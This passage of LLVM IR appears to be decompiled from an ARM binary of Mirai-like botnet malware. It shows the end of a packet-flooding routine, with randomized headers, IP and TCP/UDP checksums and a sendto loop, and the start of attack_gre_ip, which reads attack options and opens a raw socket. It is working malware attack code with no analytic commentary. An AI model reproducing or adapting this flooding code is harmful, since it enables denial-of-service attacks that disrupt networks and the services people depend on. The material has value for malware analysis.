dec_label_pc_8dfc:                                ; preds = %dec_label_pc_8fc0, %dec_label_pc_8df0
  store i32 %v1_8b40, i32* %r4.global-to-local, align 4
  store i1 %v2_8fdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8fdc, label %dec_label_pc_8ff0, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_8dfc
  %v1_8e04 = load i32, i32* @r5, align 4
  %v2_8e04 = add i32 %v1_8e04, 16
  %v3_8e04 = inttoptr i32 %v2_8e04 to i32*
  %v4_8e04 = load i32, i32* %v3_8e04, align 4
  store i32 %v4_8e04, i32* %r3.global-to-local, align 4
  %v2_8e08 = load i32, i32* @r6, align 4
  %v3_8e08 = add i32 %v2_8e08, 16
  %v4_8e08 = inttoptr i32 %v3_8e08 to i32*
  store i32 %v4_8e04, i32* %v4_8e08, align 4
  br label %dec_label_pc_8e10

dec_label_pc_8e10:                                ; preds = %bb86, %.thread11, %dec_label_pc_8ff0
  %v0_8e10 = call i32 @rand_next()
  store i32 %v0_8e10, i32* %r0.global-to-local, align 4
  store i32 %v0_8e10, i32* %stack_var_-48, align 4
  %v0_8e18 = call i32 @rand_next()
  store i32 %v0_8e18, i32* %r0.global-to-local, align 4
  store i32 %v0_8e18, i32* %stack_var_-52, align 4
  %v0_8e20 = call i32 @rand_next()
  store i32 %v2_8e24, i32* %r1.global-to-local, align 4
  store i32 %v0_8e20, i32* %stack_var_-56, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_8e30 = load i32, i32* @r7, align 4
  store i32 %v0_8e30, i32* %r0.global-to-local, align 4
  %v3_8e34 = call i32 @util_memcpy(i32 %v0_8e30, i32 %v2_8e24, i32 4)
  %v0_8e38 = load i32, i32* @r7, align 4
  %v1_8e38 = add i32 %v0_8e38, 6
  store i32 %v1_8e38, i32* %r0.global-to-local, align 4
  store i32 %v2_8e3c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_8e44 = call i32 @util_memcpy(i32 %v1_8e38, i32 %v2_8e3c, i32 4)
  %v0_8e48 = load i32, i32* @r7, align 4
  %v1_8e48 = add i32 %v0_8e48, 4
  store i32 %v1_8e48, i32* %r0.global-to-local, align 4
  store i32 %v2_8e4c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_8e54 = call i32 @util_memcpy(i32 %v1_8e48, i32 %v2_8e4c, i32 2)
  store i32 %v2_8e58, i32* %r1.global-to-local, align 4
  %v0_8e5c = load i32, i32* @r7, align 4
  %v1_8e5c = add i32 %v0_8e5c, 10
  store i32 %v1_8e5c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_8e64 = call i32 @util_memcpy(i32 %v1_8e5c, i32 %v2_8e58, i32 2)
  store i32 %v3_8e64, i32* %r0.global-to-local, align 4
  store i32 %v1_8ab4, i32* %r1.global-to-local, align 4
  store i1 %v2_8e6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8e6c, label %dec_label_pc_8e74, label %dec_label_pc_8ffc

dec_label_pc_8e74:                                ; preds = %dec_label_pc_8e10, %dec_label_pc_8ffc
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_8e78 = load i32, i32* @r5, align 4
  %v3_8e78 = add i32 %v2_8e78, 10
  %v4_8e78 = inttoptr i32 %v3_8e78 to i16*
  store i16 0, i16* %v4_8e78, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_8e80 = load i32, i32* @r5, align 4
  store i32 %v0_8e80, i32* @r0, align 4
  %v2_8e84 = call i32 @checksum_generic(i32 %v0_8e80, i32 20)
  %v3_8e84 = trunc i32 %v2_8e84 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_8e8c = load i32, i32* @r5, align 4
  %v4_8e8c = add i32 %v3_8e8c, 10
  %v5_8e8c = inttoptr i32 %v4_8e8c to i16*
  store i16 %v3_8e84, i16* %v5_8e8c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_8e94 = load i32, i32* %r3.global-to-local, align 4
  %v1_8e94 = trunc i32 %v0_8e94 to i16
  %v2_8e94 = load i32, i32* @r6, align 4
  %v3_8e94 = add i32 %v2_8e94, 10
  %v4_8e94 = inttoptr i32 %v3_8e94 to i16*
  store i16 %v1_8e94, i16* %v4_8e94, align 2
  %v0_8e98 = load i32, i32* @r6, align 4
  store i32 %v0_8e98, i32* @r0, align 4
  %v2_8e9c = call i32 @checksum_generic(i32 %v0_8e98, i32 20)
  %v3_8e9c = trunc i32 %v2_8e9c to i16
  store i32 %v2_8e9c, i32* %r0.global-to-local, align 4
  %v3_8ea0 = load i32, i32* @r6, align 4
  %v4_8ea0 = add i32 %v3_8ea0, 10
  %v5_8ea0 = inttoptr i32 %v4_8ea0 to i16*
  store i16 %v3_8e9c, i16* %v5_8ea0, align 2
  store i32 0, i32* @r4, align 4
  %v0_8ea8 = load i32, i32* @r8, align 4
  store i32 %v0_8ea8, i32* @r1, align 4
  %v1_8eac = add i32 %v0_8ea8, 4
  %v2_8eac = inttoptr i32 %v1_8eac to i16*
  %v3_8eac = load i16, i16* %v2_8eac, align 2
  %v4_8eac = zext i16 %v3_8eac to i32
  store i32 %v4_8eac, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-136.0.ph, i32* %r3.global-to-local, align 4
  %v3_8eb4 = add i32 %v0_8ea8, 6
  %v4_8eb4 = inttoptr i32 %v3_8eb4 to i16*
  store i16 0, i16* %v4_8eb4, align 2
  %v0_8eb8 = load i32, i32* @r6, align 4
  store i32 %v0_8eb8, i32* %r0.global-to-local, align 4
  %v4_8ebc = call i32 @checksum_tcpudp(i32 %v0_8eb8, i32 %v0_8ea8, i32 %v4_8eac, i32 %stack_var_-136.0.ph)
  %v5_8ebc = trunc i32 %v4_8ebc to i16
  store i32 %v4_8ebc, i32* %r0.global-to-local, align 4
  %v3_8ec0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8ec0, i32* %r2.global-to-local, align 4
  %v3_8ec4 = mul i32 %v3_8ec0, 32
  store i32 %v3_8ec4, i32* %r3.global-to-local, align 4
  %v0_8ec8 = load i32, i32* @r5, align 4
  %v1_8ec8 = add i32 %v0_8ec8, 16
  %v2_8ec8 = inttoptr i32 %v1_8ec8 to i32*
  %v3_8ec8 = load i32, i32* %v2_8ec8, align 4
  %v5_8ecc = mul i32 %v3_8ec0, 24
  store i32 %v5_8ecc, i32* %r3.global-to-local, align 4
  %v1_8ed0 = load i32, i32* @sb, align 4
  %v2_8ed0 = add i32 %v1_8ed0, %v5_8ecc
  store i32 %v2_8ed0, i32* @lr, align 4
  %v2_8ed4 = add i32 %v2_8ed0, 4
  %v3_8ed4 = inttoptr i32 %v2_8ed4 to i32*
  store i32 %v3_8ec8, i32* %v3_8ed4, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_8edc = load i32, i32* @r8, align 4
  %v4_8edc = add i32 %v3_8edc, 6
  %v5_8edc = inttoptr i32 %v4_8edc to i16*
  store i16 %v5_8ebc, i16* %v5_8edc, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_8ee4 = load i32, i32* %r1.global-to-local, align 4
  %v1_8ee4 = trunc i32 %v0_8ee4 to i16
  %v2_8ee4 = load i32, i32* %r3.global-to-local, align 4
  %v3_8ee4 = load i32, i32* @sb, align 4
  %v4_8ee4 = add i32 %v3_8ee4, %v2_8ee4
  %v5_8ee4 = inttoptr i32 %v4_8ee4 to i16*
  store i16 %v1_8ee4, i16* %v5_8ee4, align 2
  %v0_8ee8 = load i32, i32* @r4, align 4
  %v1_8ee8 = trunc i32 %v0_8ee8 to i16
  %v2_8ee8 = load i32, i32* @lr, align 4
  %v3_8ee8 = add i32 %v2_8ee8, 2
  %v4_8ee8 = inttoptr i32 %v3_8ee8 to i16*
  store i16 %v1_8ee8, i16* %v4_8ee8, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8ef0 = load i32, i32* @r5, align 4
  store i32 %v0_8ef0, i32* %r1.global-to-local, align 4
  store i32 %v3_8afc, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-132.0.ph, i32* %r2.global-to-local, align 4
  %v0_8efc = load i32, i32* @lr, align 4
  %v0_8f00 = load i32, i32* %ip.global-to-local, align 4
  %v6_8f04 = call i32 @__libc_sendto(i32 %v3_8afc, i32 %v0_8ef0, i32 %stack_var_-132.0.ph, i32 16384, i32 %v0_8efc, i32 %v0_8f00)
  %v3_8f08 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8f08, i32* %r3.global-to-local, align 4
  %v1_8f0c = add i32 %v3_8f08, 1
  store i32 %v1_8f0c, i32* %r0.global-to-local, align 4
  %v1_8f10 = load i32, i32* @sl, align 4
  %v9_8f10 = icmp eq i32 %v1_8f0c, %v1_8f10
  store i1 %v9_8f10, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8f0c, i32* %stack_var_-44, align 4
  %v6_8f18 = icmp slt i32 %v1_8f0c, %v1_8f10
  br i1 %v6_8f18, label %dec_label_pc_8d9c, label %dec_label_pc_8d88

dec_label_pc_8f20:                                ; preds = %dec_label_pc_8d9c
  %v1_8f20 = add i32 %v2_8da4, 16
  %v2_8f20 = inttoptr i32 %v1_8f20 to i32*
  %v3_8f20 = load i32, i32* %v2_8f20, align 4
  store i32 %v3_8f20, i32* %r4.global-to-local, align 4
  %v0_8f24 = call i32 @rand_next()
  store i32 %v0_8f24, i32* %r0.global-to-local, align 4
  %v3_8f28 = load i32, i32* %stack_var_-44, align 4
  %v5_8f30 = mul i32 %v3_8f28, 24
  %v0_8f34 = load i32, i32* %r4.global-to-local, align 4
  %v1_8f34 = and i32 %v0_8f34, 16711680
  store i32 %v1_8f34, i32* %ip.global-to-local, align 4
  %v3_8f38 = udiv i32 %v0_8f34, 16777216
  %v4_8f3c = udiv i32 %v1_8f34, 256
  %v5_8f3c = or i32 %v4_8f3c, %v3_8f38
  store i32 %v5_8f3c, i32* %r2.global-to-local, align 4
  %v1_8f40 = load i32, i32* @sb, align 4
  %v2_8f40 = add i32 %v1_8f40, %v5_8f30
  store i32 %v2_8f40, i32* %r1.global-to-local, align 4
  %v1_8f44 = and i32 %v0_8f34, ptrtoint (i32* @global_var_ff00.34 to i32)
  store i32 %v1_8f44, i32* %r3.global-to-local, align 4
  %v1_8f48 = add i32 %v2_8f40, 20
  %v2_8f48 = inttoptr i32 %v1_8f48 to i8*
  %v3_8f48 = load i8, i8* %v2_8f48, align 1
  %v4_8f48 = zext i8 %v3_8f48 to i32
  store i32 %v4_8f48, i32* %ip.global-to-local, align 4
  %v4_8f4c = mul i32 %v1_8f44, 256
  %v4_8f50 = mul i32 %v0_8f34, 16777216
  %v5_8f4c = or i32 %v4_8f4c, %v4_8f50
  %v5_8f50 = or i32 %v5_8f4c, %v5_8f3c
  %v7_8f54 = lshr i32 %v0_8f24, %v4_8f48
  %v8_8f54 = add i32 %v7_8f54, %v5_8f50
  store i32 %v8_8f54, i32* %r2.global-to-local, align 4
  %v1_8f58 = and i32 %v8_8f54, 16711680
  store i32 %v1_8f58, i32* %r0.global-to-local, align 4
  store i32 %v6_8ae8, i32* %r1.global-to-local, align 4
  %v5_8f70 = call i32 @llvm.bswap.i32(i32 %v8_8f54)
  store i32 %v5_8f70, i32* %r3.global-to-local, align 4
  store i1 %v7_8dcc, i1* %cpsr_z.global-to-local, align 1
  %v1_8f78 = load i32, i32* @r5, align 4
  %v2_8f78 = add i32 %v1_8f78, 16
  %v3_8f78 = inttoptr i32 %v2_8f78 to i32*
  store i32 %v5_8f70, i32* %v3_8f78, align 4
  br i1 %v2_8dcc, label %dec_label_pc_8f80, label %dec_label_pc_8dd4

dec_label_pc_8f80:                                ; preds = %dec_label_pc_8f20, %dec_label_pc_8dc8
  %v0_8f80 = call i32 @rand_next()
  store i32 %v0_8f80, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r4.global-to-local, align 4
  %v0_8f8c = load i32, i32* @fp, align 4
  %v9_8f8c = icmp eq i32 %v0_8f8c, ptrtoint (i16* @global_var_ffff.60 to i32)
  store i1 %v9_8f8c, i1* %cpsr_z.global-to-local, align 1
  %v1_8f90 = load i32, i32* @r5, align 4
  %v2_8f90 = add i32 %v1_8f90, 12
  %v3_8f90 = inttoptr i32 %v2_8f90 to i32*
  store i32 %v0_8f80, i32* %v3_8f90, align 4
  br i1 %v9_8f8c, label %dec_label_pc_8f98, label %dec_label_pc_8f80.dec_label_pc_8de4_crit_edge

dec_label_pc_8f80.dec_label_pc_8de4_crit_edge:    ; preds = %dec_label_pc_8f80
  %v1_8de8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_8de4

dec_label_pc_8f98:                                ; preds = %dec_label_pc_8f80, %dec_label_pc_8dd4
  %v0_8f98 = call i32 @rand_next()
  %v3_8fa0 = urem i32 %v0_8f98, 65536
  store i32 %v3_8fa0, i32* %r0.global-to-local, align 4
  store i32 %v3_8b48, i32* %r2.global-to-local, align 4
  %v1_8fac = sub nsw i32 999, %v3_8fa0
  store i32 %v1_8fac, i32* %r3.global-to-local, align 4
  %v1_8fb0 = load i32, i32* %r4.global-to-local, align 4
  %v9_8fb0 = icmp eq i32 %v3_8b48, %v1_8fb0
  store i1 %v9_8fb0, i1* %cpsr_z.global-to-local, align 1
  %v1_8fb4 = trunc i32 %v0_8f98 to i16
  %v2_8fb4 = load i32, i32* @r5, align 4
  %v3_8fb4 = add i32 %v2_8fb4, 4
  %v4_8fb4 = inttoptr i32 %v3_8fb4 to i16*
  store i16 %v1_8fb4, i16* %v4_8fb4, align 2
  %v0_8fb8 = load i32, i32* %r3.global-to-local, align 4
  %v1_8fb8 = trunc i32 %v0_8fb8 to i16
  %v2_8fb8 = load i32, i32* @r6, align 4
  %v3_8fb8 = add i32 %v2_8fb8, 4
  %v4_8fb8 = inttoptr i32 %v3_8fb8 to i16*
  store i16 %v1_8fb8, i16* %v4_8fb8, align 2
  br i1 %v9_8fb0, label %dec_label_pc_8fc0, label %dec_label_pc_8f98.dec_label_pc_8df0_crit_edge

dec_label_pc_8f98.dec_label_pc_8df0_crit_edge:    ; preds = %dec_label_pc_8f98
  %v1_8df4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_8df0

dec_label_pc_8fc0:                                ; preds = %dec_label_pc_8f98, %dec_label_pc_8de4
  %v0_8fc0 = call i32 @rand_next()
  %v1_8fc0 = trunc i32 %v0_8fc0 to i16
  store i32 %v0_8fc0, i32* %r0.global-to-local, align 4
  store i32 %v3_8b4c, i32* %r3.global-to-local, align 4
  %v1_8fc8 = load i32, i32* %r4.global-to-local, align 4
  %v9_8fc8 = icmp eq i32 %v3_8b4c, %v1_8fc8
  store i1 %v9_8fc8, i1* %cpsr_z.global-to-local, align 1
  %v3_8fcc = load i32, i32* @r5, align 4
  %v4_8fcc = add i32 %v3_8fcc, 58
  %v5_8fcc = inttoptr i32 %v4_8fcc to i16*
  store i16 %v1_8fc0, i16* %v5_8fcc, align 2
  br i1 %v9_8fc8, label %dec_label_pc_8fd4, label %dec_label_pc_8dfc

dec_label_pc_8fd4:                                ; preds = %dec_label_pc_8fc0, %dec_label_pc_8df0
  %v0_8fd4 = call i32 @rand_next()
  %v1_8fd4 = trunc i32 %v0_8fd4 to i16
  store i32 %v0_8fd4, i32* %r0.global-to-local, align 4
  store i32 %v1_8b40, i32* %r4.global-to-local, align 4
  store i1 %v2_8fdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8fdc, label %.thread31, label %bb86

.thread31:                                        ; preds = %dec_label_pc_8fd4
  %v3_8fe432 = load i32, i32* @r8, align 4
  %v4_8fe433 = add i32 %v3_8fe432, 2
  %v5_8fe434 = inttoptr i32 %v4_8fe433 to i16*
  store i16 %v1_8fd4, i16* %v5_8fe434, align 2
  br label %dec_label_pc_8ff0

bb86:                                             ; preds = %dec_label_pc_8fd4
  %v1_8fe0 = load i32, i32* @r5, align 4
  %v2_8fe0 = add i32 %v1_8fe0, 16
  %v3_8fe0 = inttoptr i32 %v2_8fe0 to i32*
  %v4_8fe0 = load i32, i32* %v3_8fe0, align 4
  store i32 %v4_8fe0, i32* %r3.global-to-local, align 4
  %v3_8fe4 = load i32, i32* @r8, align 4
  %v4_8fe4 = add i32 %v3_8fe4, 2
  %v5_8fe4 = inttoptr i32 %v4_8fe4 to i16*
  store i16 %v1_8fd4, i16* %v5_8fe4, align 2
  %v1_8fe8 = load i32, i32* %r3.global-to-local, align 4
  %v2_8fe8 = load i32, i32* @r6, align 4
  %v3_8fe8 = add i32 %v2_8fe8, 16
  %v4_8fe8 = inttoptr i32 %v3_8fe8 to i32*
  store i32 %v1_8fe8, i32* %v4_8fe8, align 4
  br label %dec_label_pc_8e10

dec_label_pc_8ff0:                                ; preds = %.thread31, %dec_label_pc_8dfc
  %v0_8ff0 = call i32 @rand_next()
  store i32 %v0_8ff0, i32* %r0.global-to-local, align 4
  %v1_8ff4 = load i32, i32* @r6, align 4
  %v2_8ff4 = add i32 %v1_8ff4, 16
  %v3_8ff4 = inttoptr i32 %v2_8ff4 to i32*
  store i32 %v0_8ff0, i32* %v3_8ff4, align 4
  br label %dec_label_pc_8e10

dec_label_pc_8ffc:                                ; preds = %dec_label_pc_8e10
  %v0_8ffc = load i32, i32* @r8, align 4
  %v1_8ffc = add i32 %v0_8ffc, 8
  store i32 %v1_8ffc, i32* @r0, align 4
  store i32 %v6_8a94, i32* %r1.global-to-local, align 4
  %v2_9004 = call i32 @rand_str(i32 %v1_8ffc, i32 %v6_8a94)
  store i32 %v2_9004, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8e74

dec_label_pc_900c:                                ; preds = %dec_label_pc_8b0c
  store i32 %v3_8afc, i32* %r0.global-to-local, align 4
  %v1_9010 = call i32 @__GI___libc_close(i32 %v3_8afc)
  store i32 %v1_9010, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9014

dec_label_pc_9014:                                ; preds = %entry, %dec_label_pc_900c
  %v1_901c = phi i32 [ %v3_8afc, %entry ], [ %v1_9010, %dec_label_pc_900c ]
  store i32 %v3_89ac, i32* %r4.global-to-local, align 4
  store i32 %v6_89ac, i32* %r5.global-to-local, align 4
  store i32 %v24_89ac, i32* %fp.global-to-local, align 4
  ret i32 %v1_901c

dec_label_pc_9020:                                ; preds = %dec_label_pc_8b34
  %v1_9028 = add i32 %v6_8a94, 8
  store i32 %v1_9028, i32* %r1.global-to-local, align 4
  %v1_902c = add i32 %v6_8a94, 66
  store i32 %v1_902c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_8d88.preheader

; uselistorder directives
  uselistorder i32 %v1_902c, { 1, 0 }
  uselistorder i32 %v1_9028, { 1, 0 }
  uselistorder i16 %v1_8fd4, { 1, 0 }
  uselistorder i32 %v0_8fd4, { 1, 0 }
  uselistorder i32 %v0_8fc0, { 1, 0 }
  uselistorder i32 %v3_8fa0, { 1, 0 }
  uselistorder i32 %v0_8f98, { 1, 0 }
  uselistorder i32 %v5_8f70, { 1, 0 }
  uselistorder i32 %v0_8f34, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8f10, { 1, 2, 0 }
  uselistorder i32 %v1_8f0c, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_8ec0, { 1, 0, 2 }
  uselistorder i32 %v4_8ebc, { 1, 0 }
  uselistorder i32 %v0_8ea8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8e9c, { 1, 0 }
  uselistorder i32 %v7_8db0, { 2, 1, 0, 3 }
  uselistorder i1 %v7_8dcc, { 2, 1, 0 }
  uselistorder i1 %v2_8fdc, { 2, 3, 1, 0 }
  uselistorder i32 %v0_8d20, { 1, 0, 2 }
  uselistorder i32 %v3_8b9c, { 1, 0 }
  uselistorder i32 %v3_8b80, { 1, 2, 0 }
  uselistorder i32 %v1_8b7c, { 1, 0 }
  uselistorder i32 %v1_8b40, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_8b3c, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8b38, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8b34, { 1, 0, 2, 3 }
  uselistorder i1 %v7_8b2c, { 1, 0 }
  uselistorder i1 %v7_8b00, { 1, 0 }
  uselistorder i32 %v3_8afc, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_8ae8, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_8ab4, { 1, 2, 3, 0 }
  uselistorder i32 %v6_8a94, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8a48, { 1, 2, 0 }
  uselistorder i32 %v1_8a24, { 3, 2, 1, 0 }
  uselistorder i32 %v6_8a1c, { 1, 0 }
  uselistorder i32 %v6_89e0, { 2, 1, 3, 0 }
  uselistorder i32 %v2_89c8, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 8, 7, 9, 2, 3, 4, 5, 6, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 1, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 27, 26, 28, 29, 31, 30, 32, 33, 35, 34, 37, 36, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 4, 6, 7, 5, 9, 8, 11, 10, 12, 14, 13, 15, 17, 16, 18, 19, 20, 21, 23, 22, 26, 24, 25, 29, 27, 28, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9014, { 1, 0 }
  uselistorder label %dec_label_pc_8e74, { 1, 0 }
  uselistorder label %dec_label_pc_8e10, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8d88, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8d88.preheader, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %.thread25, { 1, 0 }
}

define i32 @attack_gre_ip(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_9040 = load i32, i32* @r4, align 4
  %v6_9040 = load i32, i32* @r5, align 4
  %v24_9040 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_905c = call i32 @calloc(i32 %arg1, i32 4)
  %v0_9060 = load i32, i32* @r5, align 4
  store i32 %v0_9060, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9070 = load i32, i32* @r4, align 4
  %v5_9074 = inttoptr i32 %v0_9060 to i32*
  %v6_9074 = call i32 @attack_get_opt_int(i32 %v0_9070, i32* %v5_9074, i32 2, i32 0, i32 %v2_905c)
  %v1_9080 = urem i32 %v6_9074, 256
  store i32 %v1_9080, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_908c = load i32, i32* @r5, align 4
  store i32 %v0_908c, i32* %r1.global-to-local, align 4
  %v0_9090 = load i32, i32* @r4, align 4
  %v5_9094 = trunc i32 %v6_9074 to i8
  %v7_9098 = inttoptr i32 %v0_908c to i32*
  %v8_9098 = call i32 @attack_get_opt_int(i32 %v0_9090, i32* %v7_9098, i32 3, i32 sext (i16 ptrtoint (i16* @global_var_ffff.60 to i16) to i32), i32 %v6_9074)
  %v0_909c = load i32, i32* @r5, align 4
  store i32 %v0_909c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v8_9098, i32* %fp.global-to-local, align 4
  %v0_90ac = load i32, i32* @r4, align 4
  %v5_90b0 = inttoptr i32 %v0_909c to i32*
  %v6_90b0 = call i32 @attack_get_opt_int(i32 %v0_90ac, i32* %v5_90b0, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_90b8 = urem i32 %v6_90b0, 256
  store i32 %v1_90b8, i32* %ip.global-to-local, align 4
  %v0_90bc = load i32, i32* @r5, align 4
  store i32 %v0_90bc, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_90c8 = load i32, i32* @r4, align 4
  %v6_90d0 = inttoptr i32 %v0_90bc to i32*
  %v7_90d0 = call i32 @attack_get_opt_int(i32 %v0_90c8, i32* %v6_90d0, i32 5, i32 1, i32 %v1_90b8)
  %v1_90dc = urem i32 %v7_90d0, 256
  store i32 %v1_90dc, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_90e8 = load i32, i32* @r5, align 4
  store i32 %v0_90e8, i32* %r1.global-to-local, align 4
  %v0_90ec = load i32, i32* @r4, align 4
  %v6_90f4 = inttoptr i32 %v0_90e8 to i32*
  %v7_90f4 = call i32 @attack_get_opt_int(i32 %v0_90ec, i32* %v6_90f4, i32 6, i32 sext (i16 ptrtoint (i16* @global_var_ffff.60 to i16) to i32), i32 %v1_90dc)
  %v0_90fc = load i32, i32* @r5, align 4
  store i32 %v0_90fc, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v7_90f4, i32* @r8, align 4
  %v0_910c = load i32, i32* @r4, align 4
  %v6_9110 = inttoptr i32 %v0_90fc to i32*
  %v7_9110 = call i32 @attack_get_opt_int(i32 %v0_910c, i32* %v6_9110, i32 7, i32 sext (i16 ptrtoint (i16* @global_var_ffff.60 to i16) to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_9114 = load i32, i32* @r5, align 4
  store i32 %v0_9114, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v7_9110, i32* @r7, align 4
  %v0_9124 = load i32, i32* @r4, align 4
  %v5_9128 = inttoptr i32 %v0_9114 to i32*
  %v6_9128 = call i32 @attack_get_opt_int(i32 %v0_9124, i32* %v5_9128, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9138 = load i32, i32* @r5, align 4
  store i32 %v0_9138, i32* %r1.global-to-local, align 4
  %v0_913c = load i32, i32* @r4, align 4
  %v5_9140 = inttoptr i32 %v0_9138 to i32*
  %v6_9140 = call i32 @attack_get_opt_int(i32 %v0_913c, i32* %v5_9140, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_9148 = urem i32 %v6_9140, 256
  store i32 %v1_9148, i32* %ip.global-to-local, align 4
  %v0_914c = load i32, i32* @r5, align 4
  store i32 %v0_914c, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9158 = load i32, i32* @r4, align 4
  %v5_9160 = inttoptr i32 %v0_914c to i32*
  %v6_9160 = call i32 @attack_get_opt_int(i32 %v0_9158, i32* %v5_9160, i32 19, i32 0, i32 %v1_9148)
  %v0_9168 = load i32, i32* @r5, align 4
  store i32 %v0_9168, i32* %r1.global-to-local, align 4
  %v2_916c = load i32, i32* @global_var_24f10.62, align 4
  store i32 %v2_916c, i32* %r3.global-to-local, align 4
  store i32 %v6_9160, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_9178 = load i32, i32* @r4, align 4
  %v5_917c = inttoptr i32 %v0_9168 to i32*
  %v6_917c = call i32 @attack_get_opt_int(i32 %v0_9178, i32* %v5_917c, i32 25, i32 %v2_916c, i32 ptrtoint (i32* @0 to i32))
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_9190 = call i32 @socket(i32 2, i32 3, i32 6)
